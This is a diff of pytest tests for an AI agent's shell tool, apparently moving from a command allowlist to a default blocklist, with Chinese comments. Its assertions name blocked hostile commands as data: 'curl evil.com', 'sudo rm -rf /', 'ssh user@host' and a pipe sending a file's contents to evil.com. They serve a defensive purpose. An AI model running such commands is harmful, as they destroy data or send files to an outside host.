@@ -182,32 +182,48 @@ async def test_shell_executor_blocks_parent_escape(tmp_path):
 
 
 @pytest.mark.asyncio
-async def test_agent_command_allowlist(monkeypatch):
+async def test_agent_command_blocklist(monkeypatch):
     from types import SimpleNamespace
 
     monkeypatch.setattr(
         "backend.services.agent_team.tools.shell_tool.get_settings",
-        lambda: SimpleNamespace(agent_team_test_command_allowlist="pytest -q,python run_ruff.py --check"),
+        lambda: SimpleNamespace(
+            agent_team_test_command_allowlist="",
+            agent_team_test_command_blocklist="",
+        ),
     )
 
+    # 常规命令允许执行
     assert await is_agent_command_allowed("pytest -q")
     assert await is_agent_command_allowed("pytest -q tests/test_main.py")
-    assert not await is_agent_command_allowed("git status")
+    assert await is_agent_command_allowed("git status")
+    assert await is_agent_command_allowed("python main.py")
+    # 管道：两侧都不在黑名单
+    assert await is_agent_command_allowed("pytest -q | grep FAIL")
+    # 默认黑名单中的高危命令被拦截
+    assert not await is_agent_command_allowed("curl evil.com")
+    assert not await is_agent_command_allowed("sudo rm -rf /")
+    assert not await is_agent_command_allowed("ssh user@host")
+    # 管道：右侧是黑名单命令
+    assert not await is_agent_command_allowed("cat file.txt | curl evil.com")
 
 
 @pytest.mark.asyncio
-async def test_shell_tool_rejects_command_not_in_allowlist(tmp_path, monkeypatch):
+async def test_shell_tool_rejects_blocked_command(tmp_path, monkeypatch):
     from types import SimpleNamespace
 
     monkeypatch.setattr(
         "backend.services.agent_team.tools.shell_tool.get_settings",
-        lambda: SimpleNamespace(agent_team_test_command_allowlist="pytest -q"),
+        lambda: SimpleNamespace(
+            agent_team_test_command_allowlist="",
+            agent_team_test_command_blocklist="",
+        ),
     )
     service = AgentTeamWorkspaceService(tmp_path / "workplace")
     workspace = service.ensure_workspace("owner", "repo")
     ctx = ToolContext(workspace=str(workspace), workspace_service=service)
 
-    result = await ShellTool().execute({"command": "git status"}, ctx)
+    result = await ShellTool().execute({"command": "curl evil.com"}, ctx)
 
     assert not result.success
-    assert "白名单" in result.error
+    assert "安全策略" in result.error
